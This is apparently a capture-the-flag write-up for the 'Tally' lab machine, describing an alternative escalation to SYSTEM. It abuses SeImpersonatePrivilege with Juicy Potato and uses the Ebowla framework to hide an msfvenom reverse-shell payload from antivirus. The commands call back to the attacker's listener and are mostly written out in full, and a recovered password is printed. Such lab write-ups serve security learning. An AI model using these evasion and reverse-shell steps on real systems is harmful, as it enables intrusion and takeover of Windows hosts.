# Alternative way to exploit Tally

## Privilege Escalation - Alternative Method 1

The privilege escalation to _Administator_ can also be done in another way after we are _sarah_.
When looking at the privileges of the user _sarah_, we see that the _SeImpersonatePrivilege_ token is enabled.
```markdown
whoami /priv

# Output
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The local enumeration script **Powerup.ps1** shows her password:
> mylongandstrongp4ssword!

The SeImpersonatePrivilege token can be abused for [privilege escalation with Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/).

There is another version called [Juicy Potato](https://github.com/ohpe/juicy-potato) that I will use for this.

As we read from the text files in the home directory, Windows Defender is probably enabled and will block this so we also have to evade the Anti-Virus system. Because of that we will encode the binary with the [Ebowla Framework](https://github.com/Genetic-Malware/Ebowla).

Change the _genetic.config_ file:
```markdown
(...)
output_type = GO
(...)
payload_type = EXE
(...)
computername = 'TALLY'
(...)
```

Create a payload file with **Msfvenom**:
```markdown
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.34 LPORT=9003 -f exe -a x64 -o shell-9003.exe
```

Encode the payload _shell-9003.exe_ with **Ebowla**:
```markdown
python ebowla.py shell-9003.exe genetic.config
```

This creates the file in the _output_ folder as _go_symmetric_shell-9003.exe.go_ and we need to build it with **Go**:
```markdown
./build_x64_go.sh output/go_symmetric_shell-9003.exe.go ebowla-shell-9003.exe
```

This creates the file in the _output_ folder as _ebowla-shell-9003.exe_. Lets upload **JuicyPotato.exe** and the payload on the box via FTP:
```markdown
ftp 10.10.10.59

ftp> cd Intranet
ftp> binary
ftp> put ebowla-shell-9003.exe
ftp> put JuicyPotato.exe
```

Now execute **JuicyPotato** with the payload after starting a listener on port 9003:
```markdown
C:\FTP\Intranet\JuicyPotato.exe -l 9003 -p ebowla-shell-9003.exe -t *
```

The listener on my IP and port 9003 starts a shell as _NT AUTHORITY/SYSTEM_!
